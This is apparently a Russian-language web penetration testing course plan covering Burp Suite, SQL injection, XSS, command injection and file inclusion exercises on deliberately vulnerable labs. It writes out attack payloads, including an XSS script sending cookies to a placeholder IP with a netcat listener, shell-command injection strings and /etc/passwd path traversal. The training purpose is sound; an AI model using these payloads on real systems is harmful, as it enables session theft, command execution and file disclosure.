Неделя 15–16: Burp Suite и HTTP
Задание 15.1: Настрой Burp Suite Community как прокси (localhost:8080). Установи FoxyProxy в браузере. Зайди на http://httpbin.org/forms/post. Заполни форму, отправь. В Burp найди POST-запрос в HTTP history, отправь в Repeater, измени параметр, переотправь, посмотри ответ.

Проверка: Сделай скриншот Repeater с изменённым запросом и ответом.
Задание 15.2: Intruder. Возьми тот же POST-запрос. Поставь переменную на поле custname. Загрузи список из 10 имён. Запусти атаку Sniper. Наблюдай ответы.

Проверка: Объясни, для чего нужен Intruder.
Неделя 17–18: SQL-инъекции
Практика: PortSwigger Web Security Academy. Бесплатно. Раздел SQL injection.

Лабораторная: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data". Сделай по инструкции, но обязательно руками в Burp.
Лабораторная: "Blind SQL injection with time delays". Ты должен сам понять, как вызвать задержку и извлечь данные.
Проверка: Сделай скриншот успешно решённой лабы (галочка).
Дополнительно: Установи DVWA (Damn Vulnerable Web Application) на Metasploitable. Переключи уровень на "low". Пройди SQL Injection, SQL Injection (Blind). Задокументируй payload'ы.

Неделя 19–20: XSS
Практика: PortSwigger Academy, раздел XSS.

Отражённая XSS в поиске.
Сохранённая XSS в комментариях.
Кража куки: Запусти nc -lvp 8080 на своей машине. В поле XSS введи <script>new Image().src="http://твой_IP:8080/?cookie="+document.cookie</script>. Получи свои же куки.
Проверка: Скриншот полученных куки в netcat.
Неделя 21–22: Command Injection, File Inclusion
DVWA (Command Injection): Введи 8.8.8.8 && whoami, 8.8.8.8 | ls -la. Пойми, как работает.

DVWA (File Inclusion): LFI: ?page=/etc/passwd, ?page=../../../../etc/passwd. RFI (если включено): загрузи PHP-шелл с удалённого сервера.

Проверка: Получи содержимое /etc/passwd через уязвимость.
Неделя 23–24: Практический тест
Задание: VulnHub машина "OWASP Broken Web Applications" или "Metasploitable 2". Найди все веб-уязвимости, используя только Burp и браузер (без автоматических сканеров). Задокументируй каждую находку в мини-отчёт. Это твой первый "пентест".
